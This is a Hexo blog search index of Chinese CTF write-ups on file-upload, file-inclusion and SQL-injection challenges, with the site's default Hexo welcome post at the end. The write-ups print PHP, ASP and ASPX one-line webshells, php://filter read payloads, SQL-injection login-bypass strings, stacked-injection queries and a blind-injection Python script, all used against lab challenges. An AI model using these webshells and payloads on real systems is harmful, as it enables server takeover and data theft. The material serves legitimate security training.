<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="一：介绍"><a href="#一：介绍" class="headerlink" title="一：介绍"></a>一：介绍</h2><h3 id="1-文件上传漏洞的概述"><a href="#1-文件上传漏洞的概述" class="headerlink" title="1. 文件上传漏洞的概述"></a>1. 文件上传漏洞的概述</h3><p><strong>文件上传漏洞</strong>通常出现在基于Web的应用程序中，允许用户上传文件。如果服务器端的代码没有正确验证或限制上传的文件类型、大小、内容等，攻击者就可以利用这一漏洞上传恶意文件。例如：</p><ul><li><strong>PHP木马</strong>：攻击者可以上传一个PHP脚本文件，该文件包含恶意代码，当服务器执行这个文件时，攻击者可以控制服务器。</li><li><strong>Webshell</strong>：一种用于远程控制服务器的工具，通过上传Webshell，攻击者可以执行任意命令。</li></ul><h3 id="2-常见的文件上传漏洞场景"><a href="#2-常见的文件上传漏洞场景" class="headerlink" title="2. 常见的文件上传漏洞场景"></a>2. 常见的文件上传漏洞场景</h3><ul><li><strong>未限制文件类型</strong>：攻击者可以上传非预期的文件类型，如<code>.php</code>、<code>.asp</code>等。</li><li><strong>未限制文件大小</strong>：攻击者可以上传大文件，消耗服务器资源。</li><li><strong>不安全的文件名处理</strong>：如果服务器直接使用上传的文件名，而没有进行适当的处理或过滤，可能导致路径遍历攻击。</li><li><strong>不验证文件内容</strong>：直接将上传的文件保存到服务器，未进行任何形式的检查或消毒处理。</li></ul><h2 id="二：题目"><a href="#二：题目" class="headerlink" title="二：题目"></a>二：题目</h2><h3 id="题目1-GXYCTF-2019-BabyUpload"><a href="#题目1-GXYCTF-2019-BabyUpload" class="headerlink" title="题目1 [GXYCTF 2019]BabyUpload"></a>题目1 [GXYCTF 2019]BabyUpload</h3><p>先打开靶机，显示的是一下界面</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126214858346.png" class="" title="image-20250126214858346"><p>先上传一个jpg试试</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215007220.png" class="" title="image-20250126215007220"><p>提示太露骨了</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215053575.png" class="" title="image-20250126215053575"><p>一句话木马改成.jpg类型上传</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215648388.png" class="" title="image-20250126215648388"><p>改成.php类型</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215806119.png" class="" title="image-20250126215806119"><p>然后试试其他类型的一句话木马，用.jpg上传</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126220622866.png" class="" title="image-20250126220622866"><p>发现上传成功，接下来只需要能够解析.jpg文件中的php代码就OK了。</p><p>解析.jpg文件中的php代码，我们可以使用.htaccess文件来进行实现。</p><p>在上传.htaccess时要利用Burpsuite进行抓包，修改 Content-type为image&#x2F;jpeg然后放行</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221322956.png" class="" title="image-20250126221322956"><p>就会显示.htaccess上传成功，然后再上传那个其他类型的一句话木马</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221510409.png" class="" title="image-20250126221510409"><p>显示那个一句话木马也上传成功了，然后用蚁剑连接，先测试一下，发现连接成功</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221826260.png" class="" title="image-20250126221826260"><p>在根目录下找到flag</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126222232057.png" class="" title="image-20250126222232057"><p>点进去，就拿到flag了</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126222357384.png" class="" title="image-20250126222357384"><h3 id="题目2-SWPUCTF-2022-新生赛-Ez-upload"><a href="#题目2-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="题目2 [SWPUCTF 2022 新生赛]Ez_upload"></a>题目2 [SWPUCTF 2022 新生赛]Ez_upload</h3><p>修改过的一句话木马用.jpg上传，发现上传成功，但是蚁剑连接不上</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126223830692.png" class="" title="image-20250126223830692"><p>可以试试.php行不行</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126223940390.png" class="" title="image-20250126223940390"><p>后缀名不能有ph！ ，与上一题一样还要传入一个.htaccess用Burpsuite进行抓包，修改 Content-type为image&#x2F;jpeg然后放行<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224236462.png" class="" title="image-20250126224236462"></p><p>上传成功，再上传一次一句话木马，用蚁剑连接<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224515503.png" class="" title="image-20250126224515503"></p><p>根目录下有flag，但是打开里面是空的</p><img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224607658.png" class="" title="image-20250126224607658"><p>可以用post请求访问phpinfo()页面  post传参  cmd&#x3D;phpinfo();<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126225053720.png" class="" title="image-20250126225053720"></p><p>ctrl+f输入flag，快速定位flag</p><h2 id="三：常见的一句话木马"><a href="#三：常见的一句话木马" class="headerlink" title="三：常见的一句话木马"></a>三：常见的一句话木马</h2><p><strong>常见的一句话木马</strong>‌包括以下几种形式：‌1</p><ol><li>‌**<a href="http://www.baidu.com/s?tn=34046034_10_dg&wd=PHP&usm=5&ie=utf-8&rsv_pq=a1cb4fe400014b36&oq=%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&rsv_t=7844Gjgg4F1PE+0N/RdtYEDK6vwQZp+sHeI1nnAFqMzjfqgWSTMV7xugXr40/eVa7SVzhv4&rsv_dl=re_dqa_generate&sa=re_dqa_generate">PHP</a>木马**‌：<ul><li><code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：这是最简单的一句话木马，通过POST请求执行代码。</li><li><code>&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;</code>：通过GET请求执行代码。</li><li><code>&lt;?php assert($_POST[&#39;cmd&#39;]); ?&gt;</code>：使用assert函数执行代码。</li></ul></li><li>‌**<a href="http://www.baidu.com/s?tn=34046034_10_dg&wd=ASP&usm=5&ie=utf-8&rsv_pq=a1cb4fe400014b36&oq=%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&rsv_t=d2e2w3EckCuTGE0HFq+pTEVFEnY3SbCXkf+nNBcPZGi8n+Z4msdXmfVW2LvJW38EpNsFnB0&rsv_dl=re_dqa_generate&sa=re_dqa_generate">ASP</a>木马**‌：<ul><li><code>&lt;% execute(request(&quot;value&quot;)) %&gt;</code>：通过request对象执行代码。</li></ul></li><li>‌**<a href="http://www.baidu.com/s?tn=34046034_10_dg&wd=ASPX&usm=5&ie=utf-8&rsv_pq=a1cb4fe400014b36&oq=%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&rsv_t=15f21KD/93aSaIlfYtCZ5sIDE4O7jt1I/gntaavGYyZhZSsMSClYvPltU3Cg4Wsp9uWHdZ8&rsv_dl=re_dqa_generate&sa=re_dqa_generate">ASPX</a>木马**‌：<ul><li><code>&lt;%@ Page Language=&quot;Jscript&quot; %&gt; &lt;% eval(Request.Item[&quot;pass&quot;], &quot;unsafe&quot;); %&gt;</code>：使用Jscript语言执行代码。</li></ul></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="文件包含信息和文件类型："><a href="#文件包含信息和文件类型：" class="headerlink" title="文件包含信息和文件类型："></a>文件包含信息和文件类型：</h3><ol><li><strong>文本文件</strong>：<ul><li><code>.txt</code> 文件：通常包含文本信息，可能是直接的提示、密码、或者指向其他文件的链接。</li><li><code>.md</code> 文件（Markdown 文件）：用于格式化文本信息，可能包含链接、代码片段等。</li></ul></li><li><strong>图片文件</strong>：<ul><li><code>.png</code>, <code>.jpg</code>, <code>.gif</code> 等：图片文件可能包含隐藏的文本（如通过图片编辑软件查看隐藏信息），或者作为视觉谜题的线索。</li><li><code>.bmp</code> 文件：有时用于存储二进制数据或作为某种形式的加密或编码的输入。</li></ul></li><li><strong>音频文件</strong>：<ul><li><code>.wav</code>, <code>.mp3</code> 等：音频文件中可能包含隐藏的音频信息（如莫尔斯电码、语音消息等）。</li></ul></li><li><strong>视频文件</strong>：<ul><li><code>.mp4</code>, <code>.avi</code> 等：视频文件可能包含字幕、隐藏的图像或音频线索，或者视频本身就是一个谜题（如需要通过特定的播放器或设置来观看）。</li></ul></li><li><strong>二进制文件</strong>：<ul><li><code>.bin</code>, <code>.exe</code> 等：这些文件可能直接包含需要解密或分析的数据，或者作为某种形式的加密挑战。</li></ul></li><li><strong>压缩文件</strong>：<ul><li><code>.zip</code>, <code>.rar</code> 等：压缩文件中可能包含更多的文件或文档，解开这些压缩文件可能会揭示新的线索或挑战。</li></ul></li><li><strong>网络文件</strong>：<ul><li>网页、在线服务链接等：有时挑战会指向一个在线服务或网页，需要用户与之交互以获取信息或解决谜题。</li></ul></li></ol><h3 id="解决方法示例："><a href="#解决方法示例：" class="headerlink" title="解决方法示例："></a>解决方法示例：</h3><ul><li><strong>文本分析</strong>：仔细阅读文本内容，查找关键字、模式或隐藏的文本。</li><li><strong>图片分析</strong>：使用图片编辑软件查看隐藏信息，或者使用专门的工具（如Stegsolve）来查看图片的LSB（最低有效位）隐藏信息。</li><li><strong>音频分析</strong>：使用音频分析工具（如Audacity）来查看音频波形中的隐藏信息，或者使用频谱分析来识别隐藏的音频信号。</li><li><strong>视频分析</strong>：使用视频编辑软件查看字幕或隐藏对象，或者尝试不同的播放器设置来揭示内容。</li><li><strong>二进制分析</strong>：使用十六进制编辑器（如HxD）查看和分析二进制数据，尝试不同的编码和解码技术。</li><li><strong>网络交互</strong>：根据提供的链接进行在线交互，可能需要解决验证码、登录验证或其他类型的挑战。</li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目1-SWPUCTF-2021-新生赛-include"><a href="#题目1-SWPUCTF-2021-新生赛-include" class="headerlink" title="题目1[SWPUCTF 2021 新生赛]include"></a>题目1[SWPUCTF 2021 新生赛]include</h3><p>打开网址，出现以下界面</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232123827.png" class="" title="image-20250125232123827"><p>根据提示hackbar 并输入？file&#x3D;1</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232149377.png" class="" title="image-20250125232149377"><p>从上面可以看到flag字样，说flag在flag.php中，所以我们要想办法看到flag.php里面的内容，进行代码审计，审计得知，<code>allow_url_include</code> 设置为 <code>on</code>，且目标文件为“flag.php”我们可以利用PHP伪协议来攻击：php:&#x2F;&#x2F;filter:&#x2F;resource&#x3D;flag.php与包含文件结合时，php:&#x2F;&#x2F;filter流会被作为php文件执行，但我们只是为了提取目标文件，为了避免执行后看不到文件，对其进行编码，让其不被执行:php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232218955.png" class="" title="image-20250125232218955"><p>得到base64编码的flag，进行解码</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232238575.png" class="" title="image-20250125232238575"><p>得到flag</p><h3 id="题目2-鹏城杯-2022-简单包含"><a href="#题目2-鹏城杯-2022-简单包含" class="headerlink" title="题目2[鹏城杯 2022]简单包含"></a>题目2[鹏城杯 2022]简单包含</h3><p>打开网页</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232257799.png" class="" title="image-20250125232257799"><p>让在post里面传入flag，所以在post data里面输入flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232314601.png" class="" title="image-20250125232314601"><p>发现报错了，那就查看一下源码index.php，看看有什么条件</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232334308.png" class="" title="image-20250125232334308"><p>进行base64解码<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232348290.png" class="" title="image-20250125232348290"></p><p>审计可知使用POST传flag，preg_match过滤了flag，前面还有一个&lt;800规则<br> 也就是我输入的字符串要有800个字符才能读取到，那么我们可以使用&amp;符号构造一条语句</p><p>所以输入a&#x3D;aaaa…（一共800个）&amp;flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232358475.png" class="" title="image-20250125232358475"><p>再进行base64解码，得到flag</p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232404926.png" class="" title="image-20250125232404926">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2025/01/24/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/01/24/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li><li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li><li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li></ul><h3 id="注入常见参数-¶"><a href="#注入常见参数-¶" class="headerlink" title="注入常见参数 ¶"></a>注入常见参数 <a href="https://ctf-wiki.org/web/sqli/#_3">¶</a></h3><ul><li><code>user()</code>：当前数据库用户</li><li><code>database()</code>：当前数据库名</li><li><code>version()</code>：当前使用的数据库版本</li><li><code>@@datadir</code>：数据库存储数据路径</li><li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li><li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li><li><code>concat_ws()</code>：用法类似</li><li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li><li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li><li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li></ul><h3 id="后台万能密码-¶"><a href="#后台万能密码-¶" class="headerlink" title="后台万能密码 ¶"></a>后台万能密码 <a href="https://ctf-wiki.org/web/sqli/#_8">¶</a></h3><ul><li><code>admin&#39; --</code></li><li><code>admin&#39; #</code></li><li><code>admin&#39;/*</code></li><li><code>&#39; or 1=1--</code></li><li><code>&#39; or 1=1#</code></li><li><code>&#39; or 1=1/*</code></li><li><code>&#39;) or &#39;1&#39;=&#39;1--</code></li><li><code>&#39;) or (&#39;1&#39;=&#39;1--</code></li><li>以不同的用户登陆 <code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></li></ul><h3 id="题目1-强网杯-2019-随便注"><a href="#题目1-强网杯-2019-随便注" class="headerlink" title="题目1  [强网杯 2019]随便注"></a>题目1  [强网杯 2019]随便注</h3><p>检查是否存在sql注入，先输入1 ，1‘</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image004.jpg" class="" title="clip_image004"><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image006.jpg" class="" title="clip_image006"><p>输入1回显正常，输入1’报错，基本判断存在注入，用#注释一下试试，输入1’ or 1&#x3D;1#</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image008.jpg" class="" title="clip_image008"><p>发现存在sql注入，开始注入，先输入order by</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image010.jpg" class="" title="clip_image010"><p>发现当输入到3时报错，说明有两列。尝试union select联合查询 注入</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image012.jpg" class="" title="clip_image012"><p>发现许多都被过滤掉了，尝试双写绕过，但是失败了。查了一下这里可以用堆叠注入试试，输入了1’; show databases; #</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image014.jpg" class="" title="clip_image014"><p>可以看到成功了，存在堆叠注入，然后输入1’; show tables; # 查表</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image016.jpg" class="" title="clip_image016"><p>可以看到当前库下有两张表，先爆words表，输入1’; show columns from words; #</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image018.jpg" class="" title="clip_image018"><p>可以猜测我们提交查询的窗口就是在这个表里查询数据，然后继续爆表，表名为数字时，要用反引号包起来查询。所以要输入1’; show columns from</p><p><code>1919810931114514</code>;#</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image020.jpg" class="" title="clip_image020"><p>发现存在flag，而且只有一列</p><p>输入1’;Set @a &#x3D; CONcat(‘sel’,’ect * from <code>1919810931114514</code>;’); PREpare flag from @a;Execute flag;# ，拿到flag<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image022.jpg" class="" title="clip_image022"></p><p>参考<a href="https://blog.csdn.net/m0_69151365/article/details/136365275">https://blog.csdn.net/m0_69151365/article/details/136365275</a></p><h3 id="题目2-CISCN-2019华北Day2-Web1"><a href="#题目2-CISCN-2019华北Day2-Web1" class="headerlink" title="题目2 [CISCN 2019华北Day2]Web1"></a>题目2 [CISCN 2019华北Day2]Web1</h3><p>进入题目发现同样给出了一个框，猜测是sql注入</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image024.jpg" class="" title="clip_image024"><p>先输入1 ，1‘</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image026.jpg" class="" title="clip_image026"><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image028.jpg" class="" title="clip_image028"><p>发现输入1‘时，出现了bool(false)，显然是布尔盲注，题目中提示你想要的都在表’flag’中，列是’flag’ 现在，只需给出通道的ID </p><p>下面要先进行fuzz测试，看看过滤了哪些字符</p><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image030.png" class="" title="clip_image030">468的都是被过滤了，selec,from,括号没有过滤，用括号绕过空格，然后构造payload：id=([select](https://so.csdn.net/so/search?q=select&spm=1001.2101.3001.7020)(ascii(substr(flag,1,1))=78)from(flag))<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image032.jpg" class="" title="clip_image032"><p>经过搜索，知道了下一步需要写猜解脚本</p><p><strong>import requests<br> url &#x3D; “<a href="http://node4.anna.nssctf.cn:28102/">http://node4.anna.nssctf.cn:28102/</a>“<br> payload_str &#x3D; “(select(ascii(substr(flag,{l},1))&#x3D;{n})from(flag))”<br> data&#x3D; {“id”:payload_str}<br> def getFlag():<br>   flag &#x3D; ‘’<br>   #</strong> **从第一个字符开始截取<br>   for i in range(1,100):<br>     # 枚举字符的每一种可能性<br>     for n in range(32, 126):<br>       data[“id”] &#x3D; payload_str.format(l&#x3D;i, n&#x3D;n)<br>       response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)<br>       if ‘Hello’ in response.text:<br>         flag +&#x3D; chr(n)<br>         print(flag)<br>         break<br>     if flag[-1] &#x3D;&#x3D; ‘}’:<br>       break</p><p> if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>   getFlag()**</p><p><strong><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image034.png" class="" title="clip_image034"></strong></p><p>得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/12/25/hello-world/"/>
    <url>/2024/12/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
